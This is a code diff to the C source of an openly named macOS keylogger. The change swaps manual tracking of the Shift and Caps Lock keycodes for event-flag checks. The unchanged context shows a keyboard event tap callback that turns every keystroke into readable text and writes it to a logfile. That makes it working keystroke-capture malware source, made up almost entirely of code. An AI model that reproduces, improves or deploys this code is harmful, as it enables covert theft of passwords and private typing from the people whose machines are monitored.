@@ -1,9 +1,6 @@
 #include "keylogger.h"
 
-int keyCodeCache[127];
-int capsLock = 57;
-int leftShift = 56;
-int rightShift = 60;
+CGEventFlags lastFlags = 0;
 
 int main(int argc, const char *argv[]) {
 
@@ -64,17 +61,15 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
         return event;
     }
 
+    CGEventFlags flags = CGEventGetFlags(event);
+
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    if (keyCode == leftShift || keyCode == rightShift || keyCode == capsLock) {
-        keyCodeCache[keyCode] = keyCodeCache[keyCode] == 1 ? 0 : 1;
-        return event;
-    }
 
     // Print the human readable key to the logfile.
-    bool shift = keyCodeCache[rightShift] + keyCodeCache[leftShift] > 0;
-    bool caps = keyCodeCache[capsLock] == 1;
+    bool shift = flags & kCGEventFlagMaskShift;
+    bool caps = flags & kCGEventFlagMaskAlphaShift;
     fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
     fflush(logfile);
     return event;
